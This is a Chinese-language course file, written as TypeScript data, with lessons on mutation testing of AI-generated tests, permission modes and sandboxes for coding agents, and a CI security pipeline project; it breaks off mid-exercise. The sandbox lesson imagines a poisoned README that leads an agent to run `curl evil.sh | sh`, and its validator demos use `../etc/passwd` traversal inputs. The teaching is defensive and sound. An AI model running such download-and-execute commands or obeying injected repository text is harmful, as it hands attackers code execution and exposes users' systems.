import type { Chapter } from '../../../types';

/* ============================================================
 *  CS146S Fall 2026 · Week 6（续）：l4 测试套件评估、l5 权限与沙箱、l6 项目 D
 *  来源：官方大纲 Week 6 + OWASP LLM Top 10 + Anthropic 权限文档
 *        + 变异测试（PIT/mutmut 方法论）
 *  原创：评估框架、案例、图示、全部习题
 * ============================================================ */

export const cs146sW6ExtraChapters: Omit<Chapter, 'courseId' | 'order'>[] = [
  {
    id: 'cs146s-w6b',
    title: 'Week 6（续）· 测试评估、沙箱与项目 D',
    goal: '用变异测试戳穿"看起来很美"的 AI 测试套件；为 Agent 设计权限与沙箱边界；把本周全部能力收拢为项目 D——一条可进 CI 的 AI 代码安全流水线。',
    lessons: [
      /* ─────────────────────────── l4 ─────────────────────────── */
      {
        id: 'cs146s-w6b-l4',
        title: 'AI 生成的测试套件：评估与驯服',
        difficulty: 3,
        content: `
### 学习目标

学完本节，你应该能够：
1. 说出 AI 生成测试的三大通病（同义反复、happy-path 偏向、脆弱断言）及其形成机制；
2. 用变异分数（mutation score）量化测试套件的真实质量，解释为什么"覆盖率 100%"可能一文不值；
3. 设计"人写核心断言 + AI 扩充边界"的混合工作流，并为测试套件建立回归式评估协议。

### 前置知识

- w1-l5 的评估协议（指标先行、控制变量）；
- pytest 的基本用法（断言、参数化）。

### 问题背景

"让 AI 给代码写测试"是最常见的 AI 开发场景之一，也是最容易被假象欺骗的场景。Agent 十秒钟生成 20 个测试，全部通过，覆盖率报表一片绿——然后线上一个边界条件炸了，你回头一看：那 20 个测试里没有一个能抓住这个 bug。

问题不在"AI 不会写测试"，而在**你用了错误的指标验收测试**。测试的价值不在数量与覆盖率，在"能杀死多少坏实现"。这周官方把它放进"最硬核"的一周，因为它是整个"AI 写代码 + AI 写测试"闭环里最容易被自欺的一环。

### 直觉理解

**同义反复测试（tautological test）**：AI 读你的实现代码，然后"测试"它——最省事的方法是把实现逻辑复述成断言：

\`\`\`python
def is_adult(age):  # 实现
    return age >= 18

# AI 生成的"同义反复测试"：
def test_is_adult():
    assert is_adult(18) == (18 >= 18)      # 断言的是"实现等于实现"
\`\`\`

这个测试永远通过、永远无价值——它跟实现共享同一个脑回路，实现错了它也跟着错。**测试的尊严来自独立于实现的真实预期**（18 岁该是成人、17 岁不该是——这是需求事实，不是代码事实）。

**变异测试**就是戳穿这类假测试的体检仪：故意把代码改坏一点（18 改成 19、>= 改成 >、删一行），看你的测试能不能抓住。抓不住坏实现的测试，就是在值班室睡觉的保安。

### 核心概念与原理详解

## 三层质量指标

| 指标 | 度量什么 | 局限 |
| --- | --- | --- |
| 覆盖率 | 代码被执行过 | "执行过"≠"验证过"；100% 覆盖可以全部是同义反复 |
| 断言强度 | 断言是否验证了真实预期 | 难以自动度量，靠评审 |
| **变异分数** | 杀死的变异体 / 全部变异体 | 有算力成本；等价变异体（语义未变）会拉低分数 |

**变异分数是三者中最接近"测试真实战斗力"的指标**——它直接回答"坏实现能被抓住吗"。

## 变异测试的机制

1. **生成变异体**：对被测代码做系统性小改动——边界 ±1（18→19）、比较符翻转（>=→>）、条件取反、语句删除、常量替换；
2. **跑测试**：每个变异体单独运行测试套件；
3. **判定**：测试失败 = 变异体被杀死（好）；测试全过 = 变异体存活（你的测试有盲区）；
4. **得分**：mutation score = 杀死数 / 可杀死数。

变异体名单不是随机的——它来自历史 bug 的模式库（这正是"漏洞重演"理论的正向应用：人类常犯的错，就是该被测住的错）。

## AI 测试的三大通病与驯服法

| 通病 | 机制 | 驯服 |
| --- | --- | --- |
| 同义反复 | 测试由实现生成，共享逻辑 | 断言必须来自 Spec/AC（w3），不由实现反推 |
| happy-path 偏向 | 语料里示例测试多用正常输入 | Spec 强制"非法输入枚举"段落；用变异体反推缺失的边界用例 |
| 脆弱断言 | 断言过度具体（比较整个对象） | 评审时问"这个断言在合理重构后还会过吗" |

**混合工作流**：人（或 Spec）定核心断言与边界清单 → AI 扩充参数化矩阵与工程细节（fixture、清理）→ 变异测试算分 → 存活变异体回填为新测试目标。AI 在"量"上强，人在"预期事实"上不可替代。

### 完整案例

对 \`def discount(price, vip): return price * 0.8 if vip else price\` 的套件做变异体检。

1. **AI 生成的套件**（4 个测试）：vip 打八折、非 vip 原价、price=100 vip、price=0——全过，覆盖率 100%；
2. **变异体**：\`0.8→0.9\`、\`0.8→1.0\`、\`if vip→if not vip\`、\`price * → price +\`；
3. **结果**：变异体 1（0.9）存活！——因为套件从没断言过"八折"这个具体数字（price=0 时 0.9 倍也是 0）；
4. **修复**：加一条真断言 \`discount(100, True) == 80\`，再跑变异 → 4/4 杀死；
5. **教训**：4 个测试、100% 覆盖、全绿报表，防不住一个系数写错——**变异分数说真话**。

### 代码实践

下面是一个完整的迷你变异测试器（被测函数 + 变异体库 + 判分循环）。你将在 code 习题中扩展它的变异体库。

### 常见误区与安全风险

- **误区一："覆盖率 100% 就稳了。"** 覆盖率是必要条件不是充分条件——本节案例里 100% 覆盖照样放走变异体。
- **误区二："AI 生成的测试多多益善。"** 同义反复测试会制造虚假安全感，还会拖慢流水线。验收测试看变异分数与断言评审，不看数量。
- **误区三："变异测试太贵，生产用不起。"** 全量变异贵，但"核心模块 + 高危变更"的定向变异很便宜——把变异测试当抽查仪而不是 X 光机。
- **安全提示**：AI 测试也是上下文注入的潜在载体（测试 fixture 里可以藏恶意 setup 代码）——外部贡献的测试代码与业务代码同等审查（呼应 l1 依赖链威胁）。

### 知识关联：承上启下

- 承上：w1-l5 的实验协议是本节评估方法论的基础；l2 的"缺失型缺陷"正是变异测试的靶子；
- 启下：l5 的沙箱保证"变异体/测试跑在笼子里"；l6 项目 D 把变异测试作为流水线的可选站。

### 动手实验

1. 运行下方迷你变异测试器，记录每个变异体的生死，找出存活者并写出补测断言；
2. 把你最近一次 AI 生成的测试拿来做一次"同义反复审计"：每条断言问一句"这个预期来自 Spec 还是来自实现？"

### 本节总结

1. AI 测试三大通病：同义反复（测试复读实现）、happy-path 偏向、脆弱断言；
2. 变异分数直接度量"坏实现能否被抓住"，是比覆盖率诚实的指标；
3. 变异体模式来自历史 bug 库——漏洞重演理论的正向应用；
4. 混合工作流：人定预期事实（Spec/AC），AI 扩量，变异测试验收；
5. 存活变异体 = 免费的缺失用例清单。

### 参考资料与延伸阅读

- 变异测试方法论（mutmut / PIT 官方文档）——对应"变异测试的机制"；
- 《How Long Contexts Fail》与 w1-l4——同义反复测试的生成机制解释（测试与实现同源）；
- 官方 W6 阅读清单中 AI 生成测试套件的讨论——对应"三大通病"；
- 本节迷你变异测试器、discount 案例为自主设计的原创教学内容。

### 本节习题导引

fill 题默写三层指标；code 题扩展变异体库并计算变异分数；open 题给你的测试套件做一次完整的变异体检报告。
`,
        tips: [
          { kind: 'pitfall', text: 'AI 测试的每条断言都问一句"这个预期来自 Spec 还是来自实现？"——来自实现的是同义反复，必须重写。' },
          { kind: 'performance', text: '变异测试当抽查仪用：只对核心模块与高危 diff 跑，成本降两个量级，收益保留八成。' },
          { kind: 'leak', text: '外部贡献的测试代码要按业务代码同等审查——fixture 的 setup 里可以藏任意代码。' },
        ],
        demos: [
          {
            title: '迷你变异测试器',
            lang: 'python',
            code: `# 被测函数与其变异体
IMPL = "def discount(price, vip):\\n    return price * 0.8 if vip else price\\n"
MUTANTS = [
    ("系数抬高",   "def discount(price, vip):\\n    return price * 0.9 if vip else price\\n"),
    ("系数归一",   "def discount(price, vip):\\n    return price * 1.0 if vip else price\\n"),
    ("条件反转",   "def discount(price, vip):\\n    return price * 0.8 if not vip else price\\n"),
    ("乘变加",     "def discount(price, vip):\\n    return price + 0.8 if vip else price\\n"),
]

TESTS = [
    ((100, True), 80),    # 人写的核心断言: 八折就是 80
    ((100, False), 100),
]

def run(code, args):
    ns = {}
    exec(code, ns)
    return ns["discount"](*args)

def mutation_score():
    killed = 0
    for name, code in MUTANTS:
        alive = all(run(code, a) == e for a, e in TESTS)
        print(f"{name:<6} -> {'存活(测试盲区!)' if alive else '被杀死'}")
        killed += (not alive)
    print(f"变异分数: {killed}/{len(MUTANTS)} = {killed/len(MUTANTS):.0%}")

mutation_score()
# 观察点: 系数抬高存活 -> 因为 TESTS 没有断言 80 这个数字的测试?
# 不, (100,True)->80 已断言 —— 换成删除该条再跑, 看分数如何崩塌`,
          },
        ],
      },

      /* ─────────────────────────── l5 ─────────────────────────── */
      {
        id: 'cs146s-w6b-l5',
        title: '权限与沙箱：给 Agent 划地盘',
        difficulty: 3,
        content: `
### 学习目标

学完本节，你应该能够：
1. 按任务风险为 Agent 选择权限模式（read-only / ask-to-edit / auto-edit / yolo），并写出升级与降级的触发条件；
2. 解释路径校验为什么必须用"规范化 + 共同祖先"而不是字符串前缀，并实现一个防穿越的目录白名单校验器；
3. 设计"动态权限收窄"：同一个 Agent 会话在探索/执行/清理三个阶段的权限差异。

### 前置知识

- w2-l6 项目 C 的权限三层（静态白名单 → 动态确认 → 审计日志）；
- l3 的输出侧命令审查（本节的沙箱是它的执行层落地）。

### 问题背景

l3 的通道隔离解决"注入能不能得手"，本节的权限与沙箱解决"**得手之后能破坏多大**"。这两层合起来才是完整的纵深：前者降概率，后者限半径。

实战中的教训非常一致：**出事的 Agent 几乎都是权限配得过宽的 Agent**。"先全开图省事，回头再收紧"是 Agent 安全事故的头号根因——因为"回头"从不来。官方课程把权限管理放在安全周，与 MCP（Week 2）呼应成一条线：工具定义时声明权限，会话运行时收窄权限，出事后审计日志可回放。

### 直觉理解

**给 Agent 权限 = 给实习生配门禁卡。** 你不会因为"他看起来很聪明"就把服务器机房、财务室、大门钥匙全给他。合理的做法：

- 按任务发卡（今天整理档案 → 只给档案室）；
- 敏感区域双人模式（进机房需要你刷卡确认）；
- 全程监控（门禁日志 = 审计日志）；
- 下班收卡（任务结束权限回收）。

**yolo 模式 = 把整串钥匙插在门上走人。** 不是不能用——低价值、可回滚、强隔离的环境里它最快——但必须清醒地知道自己在什么环境里这么干。

### 核心概念与原理详解

## 权限模式谱系

<Diagram type="permmodes" />

| 模式 | 读 | 写 | 执行 | 适用 |
| --- | --- | --- | --- | --- |
| read-only | ✓ | ✗ | ✗ | 调研、审查、问答 |
| ask-to-edit | ✓ | 逐次确认 | 确认后 | 默认开发模式 |
| auto-edit | ✓ | 工作区内自动 | 白名单命令 | 隔离环境里的批量任务 |
| yolo | ✓ | ✓ | ✓ | 沙箱容器内的低价值高频任务 |

**两条铁律**：① 模式跟随任务风险，不跟随你的耐心程度；② 升级要有闸（人工确认一次），降级要有信号（错误率/破坏迹象）。

## 沙箱的四个维度

1. **文件系统**：目录白名单 + 路径规范化校验（下面细讲）；
2. **网络**：默认断网或域名白名单——数据外泄与 \`curl | sh\` 都走网络；
3. **进程**：专用低权限用户/容器运行（隔离预览，容器实操在 w9 运维展开）；
4. **资源**：CPU/内存/时长/token 预算上限——资源耗尽既是漏洞（l2 的 CWE-400）也是失控 Agent 的自保闸。

## 路径校验的正确姿势

防目录穿越（\`../../etc/passwd\`）的错法与对法：

\`\`\`python
# ✗ 错法: 字符串前缀检查 —— 被规范化绕过
assert path.startswith("/sandbox")   # "/sandbox/../etc" 前缀也对!

# ✓ 对法: 规范化后检查共同祖先
import os
real = os.path.realpath(path)            # 解析符号链接与 ..
ok = real == root or real.startswith(root + os.sep)
\`\`\`

三个必答问题：**符号链接解析了吗**（realpath）、**\`..\` 展开了吗**（realpath 一并处理）、**大小写与分隔符**（Windows 的路径分隔符与大小写不敏感特性，用 \`os.path\` 系列而非手写字符串比对）。

## 动态权限收窄

同一会话按阶段切换权限：

| 阶段 | 权限 | 理由 |
| --- | --- | --- |
| 探索（读代码） | read-only | 还没定方案，先不给写权 |
| 执行（改代码+跑测试） | auto-edit（工作区）+ 白名单命令 | 主体工作 |
| 清理与提交 | ask-to-edit + 禁网 | 提交前所有动作可审 |

这套"阶段-权限"矩阵写进项目指令文件，就是一份机器可执行的权限契约。

### 完整案例

场景：给"依赖升级 Agent"（w5-l4 案例）配权限。

1. **任务风险分析**：会改依赖声明（中危）、会跑安装与测试（中危）、会上网拉包（高危）、不改业务代码（低危）；
2. **模式选择**：auto-edit（工作区限定）+ 命令白名单（pip install 指定源、pytest、git commit）+ **网络仅限包管理域名**；
3. **阶段矩阵**：探索期 read-only；执行期如上；提交期 ask-to-edit（PR 创建前人工过目 diff）；
4. **沙箱**：容器内运行，工作区挂载为唯一可写卷，CPU 限时 10 分钟、token 预算 100K；
5. **注入推演**（l3 联动）：假设 README 投毒诱导执行 \`curl evil.sh | sh\`——网络白名单直接断链（非白名单域名出不去），命令审查器 block，双保险。
6. **审计**：全程命令与网络请求留日志，可回放。

### 代码实践

下面实现最小沙箱路径校验器 + 权限模式矩阵查询。你将在 code 习题中完善它对 Windows 路径与符号链接的处理。

### 常见误区与安全风险

- **误区一："先全开再收紧。"** 权限收紧没有"回头"，从第一天起按最小权限配。
- **误区二："字符串前缀就算路径校验。"** \`/sandbox/../etc\`、符号链接、Windows 大小写都会绕过前缀检查——必须 realpath + 共同祖先。
- **误区三："沙箱 = 绝对安全。"** 沙箱限制的是破坏半径；逃逸（container escape）风险真实存在。沙箱 + 审计 + 最小数据暴露三层并行，不给单点全信的机会。
- **安全提示**：审计日志本身要只读化（append-only）——能被 Agent 改写的审计日志等于没有审计。

### 知识关联：承上启下

- 承上：w2-l6 的权限三层是本节的协议层；l3 的输出审查是本节的决策层；本节是执行层；
- 启下：w9 运维周会把"进程隔离"展开为容器与最小化部署；l6 项目 D 的流水线每一站都在沙箱里跑。

### 动手实验

1. 运行下方沙箱校验器，依次测试正常路径、\`..\` 穿越、嵌套符号链接（在本地真实环境里试试 \`os.path.realpath\` 对符号链接的行为）；
2. 给"每日依赖更新 Agent"（w5 案例）写出它的"阶段-权限"矩阵，并与 l3 的命令审查规则合并成一份权限契约。

### 本节总结

1. 权限模式四档按任务风险选择；升级有闸、降级有信号；
2. 沙箱四维：文件系统白名单、网络策略、进程隔离、资源上限；
3. 路径校验三问：realpath 了吗、\`..\` 展开了吗、平台差异处理了吗；
4. 动态收窄：探索/执行/清理阶段各有权限契约；
5. 权限限制破坏半径，与 l3 的通道隔离（降概率）构成完整纵深。

### 参考资料与延伸阅读

- Anthropic《Claude Code 权限模式与沙箱文档》——对应权限模式谱系；
- OWASP：A01 访问控制失效——对应"路径穿越"与最小权限；
- Python \`os.path.realpath\`/\`commonpath\` 官方文档——对应路径校验实现；
- 官方 W2 阅读清单中 MCP 授权规范——对应"权限在工具定义时声明"；
- 阶段-权限矩阵、依赖升级 Agent 案例为自主设计的原创教学内容。

### 本节习题导引

fill 题默写沙箱四维；code 题实现跨平台沙箱校验器；open 题为一个真实 Agent 会话设计完整权限契约。
`,
        tips: [
          { kind: 'pitfall', text: '路径校验用字符串前缀 = 没有校验：/sandbox/../etc 前缀匹配但已越界。永远 realpath 后比共同祖先。' },
          { kind: 'performance', text: '审计日志 append-only 是底线——能被 Agent 改写的审计日志等于没有审计。' },
          { kind: 'interview', text: '"yolo 模式能不能用？"——能，限定在强隔离+低价值+可回滚场景；答出适用边界比一刀切禁止更显工程成熟度。' },
        ],
        demos: [
          {
            title: '最小沙箱路径校验器',
            lang: 'python',
            code: `import os

class Sandbox:
    def __init__(self, root):
        self.root = os.path.realpath(root)

    def check(self, path):
        real = os.path.realpath(os.path.join(self.root, path))
        ok = real == self.root or real.startswith(self.root + os.sep)
        return ok, real

sb = Sandbox("/tmp/project")
for p in ["src/main.py", "../etc/passwd", "a/../../b.txt", "sub/./x.py"]:
    ok, real = sb.check(p)
    print(f"{'PASS' if ok else 'DENY':<5} {p:<16} -> {real}")

MODES = {
    "read-only":  {"read": True,  "write": False, "exec": False},
    "ask-to-edit": {"read": True, "write": "ask",  "exec": "ask"},
    "auto-edit":  {"read": True,  "write": True,  "exec": "whitelist"},
    "yolo":       {"read": True,  "write": True,  "exec": True},
}
print("auto-edit 的执行权:", MODES["auto-edit"]["exec"])

# 观察点: ../ 与 a/../.. 都被 realpath 归一化后拒绝
# 前缀字符串检查对这两条会误放行 —— 这就是"必须规范化"的原因`,
          },
        ],
      },

      /* ─────────────────────────── l6 ─────────────────────────── */
      {
        id: 'cs146s-w6b-l6',
        title: '项目 D：AI 代码安全流水线（实践项目）',
        difficulty: 4,
        content: `
### 学习目标

学完本节，你应该能够：
1. 完整说出项目 D 的需求、架构与每一站的输入/输出/门禁规则；
2. 按实现步骤搭建"测试→扫描→安全检查→AI 审查→报告"五站流水线，并让每站可独立跳过/启用；
3. 为流水线本身设计验收测试（恶意样本必拦、干净样本必过、误报率可度量）。

### 前置知识

- w1-l5 评估协议（流水线的指标体系来源）；
- l1-l5 全部内容（流水线是本周的收拢）；
- 基本的 CI 概念（GitHub Actions 的 job/step 名词即可）。

### 问题背景

前五节给了你一堆分散的防御武器：安全 AC、扫描三明治、注入三件套、变异测试、权限沙箱。散装武器的问题是**依赖人的记性**——赶工期时第一件被跳过的永远是安全检查。项目 D 要做的是把武器变成**流水线**：代码进门自动过站，任何一站红灯即阻断，报告自动生成。这也是官方 Week 6 作业（write secure AI code）的工程化收尾。

**为什么门禁必须自动化？** 因为 AI 的生成速度已经把"人记得跑一遍检查"这条假设彻底摧毁。流水线的本质是：把安全纪律从"人的美德"变成"系统的默认"。

### 直觉理解

把流水线想象成食品工厂的质检传送带：原料（PR/AI 变更）从一端进，依次经过金属探测（静态扫描）、成分化验（安全检查）、试吃（测试与变异）、品控签字（AI 审查+人终审），最后贴标出厂（报告）。**任何一站不合格，传送带就停下**——没有"这批先过下批再检"的选项，因为坏了的批次混进市场，召回成本是拦下成本的百倍。

### 核心概念与原理详解

## 需求说明（Requirement）

为一个 Python 项目（建议直接用项目 A 的 mini-agent 或项目 B 的仓库）构建：

1. **触发**：本地命令 + CI（PR 触发）双入口；
2. **五站**：单元测试与覆盖率 → 静态扫描（规则式）→ 安全检查（依赖审计 + 秘密泄露检测 + 注入模式库）→ AI 审查（对 diff 做风险评述 + 告警初裁）→ 报告生成（汇总 + 门禁判定）；
3. **门禁规则**：测试不过 → block；critical 告警 → block；high 告警 → block 除非人审批注；medium 及以下 → 放行并记录；
4. **可配置**：每站可独立开关（config 文件），预算受限时允许"快车道"（只跑测试+扫描）但必须打标记。

## 技术设计（Architecture）

<Diagram type="reviewpipe" />

\`\`\`text
PR/本地触发
   │
   ▼
[1 单元测试站]  pytest + 覆盖率阈值
   │ pass
   ▼
[2 静态扫描站]  规则引擎(l2 指纹库) → findings.json
   │
   ▼
[3 安全检查站]  依赖审计 + 秘密检测 + 注入模式
   │
   ▼
[4 AI 审查站]   diff → 风险评述 + 告警初裁(误报打标)
   │
   ▼
[5 报告站]      汇总 + 门禁判定(block/pass/flag) + 报告.md
\`\`\`

**关键设计决策**：

- **每站产出结构化 JSON**（不是日志文本）——站与站解耦，任何一站可独立重跑；
- **AI 审查站的职责是初裁与风险叙述，不是终审**（l2 三明治原则）；
- **报告是给人看的单一入口**：一页纸结论（block 理由清单）+ 附录明细；
- **全流程在沙箱中执行**（l5）：工作区白名单 + 断网（AI 审查站除外，它需要调用模型 API——这是唯一出网点，须白名单域名）。

### 完整案例：一次真实的流水线首跑

用项目 A 的 mini-agent 仓库做首个接入对象：PR 内容是"给 trace 模块加 JSON 输出"。首跑结果——站 1 全过（3 个测试）；站 2 抓到 1 条 medium（命名不规范）；站 3 抓到 1 条 high（README 示例里出现了示例 token 字面量）；站 4 初裁把命名条目标为 drop（理由：与仓库既有命名一致）、把 token 条目标为 keep（理由：示例也应使用占位符）；站 5 判定 flag。修复耗时 4 分钟，二次全绿。**这次首跑验证了三件事：finding 模型在站间无损流转、AI 初裁有理有据、门禁分级符合直觉——流水线"活"了。**

## 实现步骤（Implementation Steps）

1. 定义统一 finding 模型（\`{station, severity, rule, file, line, message, suggestion}\`）与 config 加载；
2. 实现站 1：\`pytest --json\` 解析 + 覆盖率阈值判定；
3. 实现站 2：把 l2 的指纹库规则搬进来，扫 diff 范围内的文件；
4. 实现站 3：秘密检测（正则库：API key/token/私钥格式）+ 依赖清单审计（对比已知风险库表）；
5. 实现站 4：构造 diff 提示词 → 模型输出风险评述 JSON → 对站 2/3 的告警做初裁（keep/drop + 理由）；无 API 时用规则模拟器降级运行；
6. 实现站 5：汇总判定门禁 + 渲染 Markdown 报告；
7. 主控制器：顺序执行、失败短路、每站可跳过；
8. 写流水线自身的验收测试（见下）；
9. 接入 CI（PR 触发，报告作为 artifact/评论输出）；
10. 用三个"演练 PR"端到端验收：干净 PR / 注入后门 PR / 依赖投毒 PR。

## 测试用例（Test Cases，流水线自身的验收）

| # | 用例 | 期望 |
| --- | --- | --- |
| 1 | 干净 PR（只改注释） | 5 站全绿，pass |
| 2 | 含 f-string SQL 的 diff | 站 2 critical → block |
| 3 | diff 里硬编码 API key | 站 3 critical → block |
| 4 | 依赖清单新增未审计包 | 站 3 high → block/flag（按配置） |
| 5 | 空 except 包住权限校验 | 站 2/4 至少一站标红 → block |
| 6 | AI 审查站降级模式（无 API） | 流水线可完成，报告标注"初裁降级" |
| 7 | 站 2 被配置关闭 | 报告明确标注缺失站，门禁按"缺站=flag" |
| 8 | 恶意样本回归集（l3 的载荷样本） | 全部被对应站拦截 |
| 9 | 误报率度量：对干净历史 PR 批量跑 | 误报率记录并可追踪（初裁回测数据） |
| 10 | 报告渲染完整性 | block 理由清单与 findings 一一对应，无丢失 |

## 常见故障排查表（Troubleshooting）

| 故障 | 现象 | 根因 | 处置 |
| --- | --- | --- | --- |
| 告警洪水 | 每次都几十条 high | 规则过宽/扫描全仓而非 diff | 限 diff 范围；规则分级；AI 初裁压缩 |
| 站间数据不兼容 | 站 4 读不到站 2 的输出 | finding 模型字段不一致 | 模型统一 + schema 校验（步骤 1 先行） |
| AI 初裁全放行 | 初裁形同虚设 | 提示词无判据 | 给初裁模型 l2 的判定标准 + 少样本样例 |
| 误杀率过高 | 正常 PR 频繁 block | critical 规则误配 | 用干净历史 PR 回测规则，调整阈值 |
| CI 超时 | 流水线被 GitHub 掐断 | 变异/扫描站太重 | 快车道配置 + 缓存 + 定向扫描 |
| 报告没人看 | block 了但没人读报告 | 报告噪音大 | 一页纸结论制，明细进附录 |

## 完成标准（Definition of Done）

- [ ] 五站全部实现且可独立开关（config 生效）；
- [ ] 门禁规则按 critical/high/medium 分级执行，人审通道可用；
- [ ] 10 条验收用例全部通过；
- [ ] 三个演练 PR 端到端结果符合预期；
- [ ] 报告自动生成且含初裁回测数据；
- [ ] 全流程沙箱内运行，出网仅白名单域名；
- [ ] README 写清"如何新增一条扫描规则/如何调整门禁"（可运维性）。

## 拓展任务（Extensions）

1. **接入变异测试站**（l4）：对核心模块定向变异，把变异分数写进报告；
2. **初裁回测闭环**：用终审结果持续回测 AI 初裁准确率，绘制趋势图（w1-l5 协议）；
3. **依赖签名与 SLSA 预览**：为站 3 增加"包来源信誉"维度（发布时长/维护者/下载量启发式）；
4. **多仓库复用**：把流水线抽成可安装的 CLI 工具，给项目 B 的仓库直接用——体验"工具化"与"脚本化"的差别；
5. **对接 w7 的审查维度**：让 AI 审查站输出 w7 将学的多维审查清单，为下一周铺路。

### 常见误区与安全风险

- **误区一："流水线越严越好。"** 误杀率过高会训练出"惯性审批"的人（橡皮图章，w4-l5 反模式）——门禁阈值要与误报率联动校准。
- **误区二："AI 审查站等于安全专家。"** 它是初裁员。把它写进 DoD 的位置是"压缩人审量"，不是"替代人审"。
- **误区三："报告生成就完了。"** 没有回测数据的报告会腐化（规则漂移无人知晓）——误报率与初裁准确率是流水线的"体检指标"。
- **安全提示**：流水线自身是高危系统（能 block 一切变更）——对它的 config 修改要走与代码变更同级的审查，防止"把门禁调成永过"的注入变体。

### 知识关联：承上启下

- 承上：l1 威胁模型定防御分层，l2 定扫描三明治，l3 定注入回归集，l4 定测试评估，l5 定沙箱——本项目是五者的组装说明书；
- 启下：w7 的代码审查维度会替换/增强站 4 的提示词；w9 的可观测性方法论会用在流水线自身的指标上；项目 E（毕业项目）把本流水线当作 Software Factory 的质检车间。

### 动手实验

先跑通"最小可行版"：站 2 + 站 5（扫描 + 报告）两个站，用 l2 的指纹库演示代码当站 2 的内核，对一段含漏洞的样例 diff 出第一份报告。然后再按实现步骤补全。

### 本节总结

1. 流水线的本质：把安全纪律从"人的美德"变成"系统的默认"；
2. 五站架构：测试→扫描→安全→AI 初裁→报告；每站结构化输出、可独立开关；
3. 门禁分级：critical 一票否决、high 可申诉、medium 记录；缺站=flag；
4. 流水线自己也要被测试：恶意样本必拦、干净样本必过、误报率可度量；
5. AI 站是初裁不是终审——三明治原则的工程化落地。

### 参考资料与延伸阅读

- 官方作业仓库 week6（write secure AI code）——本项目 D 的主题锚点（实现为自主设计）；
- GitHub Actions 官方文档——CI 接入对应"实现步骤 9"；
- Semgrep 官方文档（规则编写）——若用真实扫描器替换教学版规则引擎；
- OWASP LLM Top 10——站 3/4 的检查项来源；
- 本节五站架构、finding 模型、验收用例表为自主设计的原创教学内容。

### 本节习题导引

fill 题检查门禁分级规则；code 题实现门禁判定器；open 题为流水线设计一次"规则漂移"的回归方案。
`,
        tips: [
          { kind: 'pitfall', text: '流水线 config 的修改必须走同级审查——"把门禁调成永过"是内部注入的最简单形态。' },
          { kind: 'performance', text: '先跑"站2+站5"最小可行版再补全——流水线项目最大的死法是五站全铺开后第一个 bug 都查不动。' },
          { kind: 'interview', text: '"你们的 AI 代码怎么保证安全？"——答五站流水线 + 三明治初裁 + 误报率回测，这是可以讲 10 分钟的体系化答案。' },
        ],
        demos: [
          {
            title: '门禁判定器（站 5 的核心逻辑）',
            lang: 'python',
            code: `from dataclasses import dataclass

@dataclass
class Finding:
    station: str
    severity: str     # critical / high / medium / low
    rule: str
    message: str

def gate(findings, waived=None):
    waived = waived or set()          # 人审批注的 rule 集合
    blocking = [f for f in findings
                if f.severity == "critical" or (f.severity == "high" and f.rule not in waived)]
    return ("block", blocking) if blocking else ("pass", [])

findings = [
    Finding("scan", "critical", "sql-injection", "f-string 进 SQL"),
    Finding("security", "high", "new-dep", "未审计依赖 left-pad-x"),
    Finding("scan", "medium", "style", "命名不规范"),
]
print(gate(findings))
print(gate(findings, waived={"new-dep"}))   # 人审批注后 high 放行

# 观察点: critical 无豁免通道; high 可申诉; medium 不参与门禁
# 这就是"分级门禁"的判义核心`,
          },
        ],
      },
    ],
    exercises: [
      /* ───────── l4 习题（8 题）───────── */
      {
        id: 'cs146s-w6b-l4-e1', type: 'fill', difficulty: 2, relatedLessonId: 'cs146s-w6b-l4', tags: ['K', 'testing'],
        question: '测试套件三层质量指标：______（执行过≠验证过）、断言强度（是否验证真实预期）、______分数（杀死的变异体占比）。',
        blanks: [['覆盖率', 'coverage'], ['变异', 'mutation']],
        explanation: '三者中变异分数最接近"测试真实战斗力"——它直接回答"坏实现能否被抓住"。',
      },
      {
        id: 'cs146s-w6b-l4-e2', type: 'single', difficulty: 2, relatedLessonId: 'cs146s-w6b-l4', tags: ['U', 'testing'],
        question: 'AI 生成的测试里出现 `assert is_adult(18) == (18 >= 18)`，这类测试的问题是什么？',
        options: [
          { value: 'a', text: '断言的预期来自实现本身（同义反复），实现错了它也跟着"对"' },
          { value: 'b', text: '断言写得太短' },
          { value: 'c', text: '没有使用 pytest 风格' },
          { value: 'd', text: '没有问题，这是最佳实践' },
        ],
        answer: 'a',
        explanation: '同义反复测试与实现共享脑回路，永远通过、永远无价值。断言的预期必须来自 Spec/AC（需求事实），不由实现反推。',
      },
      {
        id: 'cs146s-w6b-l4-e3', type: 'judge', difficulty: 2, relatedLessonId: 'cs146s-w6b-l4', tags: ['U', 'testing'],
        question: '测试覆盖率 100% 且全部通过，说明该测试套件能可靠防止回归。',
        answer: false,
        explanation: 'l4 案例：4 个测试 100% 覆盖全绿，照样放走"0.8→0.9"变异体。覆盖率是必要条件不是充分条件。',
      },
      {
        id: 'cs146s-w6b-l4-e4', type: 'multiple', difficulty: 3, relatedLessonId: 'cs146s-w6b-l4', tags: ['U', 'testing'],
        question: '变异测试中，下列哪些是标准的变异操作？',
        options: [
          { value: 'a', text: '边界值 ±1（18→19）' },
          { value: 'b', text: '比较符翻转（>= 改为 >）' },
          { value: 'c', text: '删除语句' },
          { value: 'd', text: '把函数名改成更易读的名字' },
        ],
        answer: ['a', 'b', 'c'],
        explanation: '变异=系统性地"改坏"语义：边界、翻转、取反、删除、常量替换。d 是重构不是变异——语义不变，测试应继续通过（它属于"等价变异体"问题的近亲）。',
      },
      {
        id: 'cs146s-w6b-l4-e5', type: 'code', difficulty: 4, relatedLessonId: 'cs146s-w6b-l4', tags: ['D', 'testing'],
        question: '实现 `mutation_score(impl: str, mutants: list[str], tests: list[tuple[tuple, object]])`：impl 与 mutants 都是含函数 `f` 定义的代码字符串；对每个变异体跑全部 tests（(args, expected) 元组），全部通过=存活；返回 (杀死数, 变异分数)。分数保留两位小数。',
        lang: 'python',
        starterCode: `def mutation_score(impl, mutants, tests):
    # 返回 (killed, score); score = killed/len(mutants) 保留两位
    pass

impl = "def f(x):\\n    return x * 2\\n"
mutants = ["def f(x):\\n    return x * 3\\n", "def f(x):\\n    return x + 2\\n", impl]
print(mutation_score(impl, mutants, [((4,), 8), ((0,), 0)]))`,
        expectedOutput: '(2, 0.67)',
        tests: `impl = "def f(x):\\n    return x * 2\\n"
mutants = ["def f(x):\\n    return x * 3\\n", "def f(x):\\n    return x + 2\\n", impl]
assert mutation_score(impl, mutants, [((4,), 8), ((0,), 0)]) == (2, 0.67)
k, s = mutation_score(impl, mutants[:1], [((4,), 8)])
assert k == 1 and s == 1.0, "单变异体全杀"
k2, s2 = mutation_score(impl, [impl], [((4,), 8)])
assert k2 == 0 and s2 == 0.0, "原实现作为'变异体'必然存活"
k3, s3 = mutation_score(impl, mutants, [])
